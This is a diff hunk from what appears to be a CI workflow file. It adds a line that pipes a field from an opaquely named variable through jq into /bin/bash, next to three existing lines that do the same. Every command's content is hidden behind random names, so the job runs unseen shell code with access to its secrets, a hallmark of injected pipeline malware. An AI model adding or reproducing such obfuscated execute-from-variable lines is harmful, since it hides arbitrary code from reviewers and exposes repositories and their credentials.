@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$wtar9" | jq -r .bcm08 | /bin/bash
           echo $u38 | jq -r .sgck7 | /bin/bash
           echo $ltxe53 | jq -r .rudi76126 | /bin/bash
+          echo $lh80 | jq -r .zvoh02 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
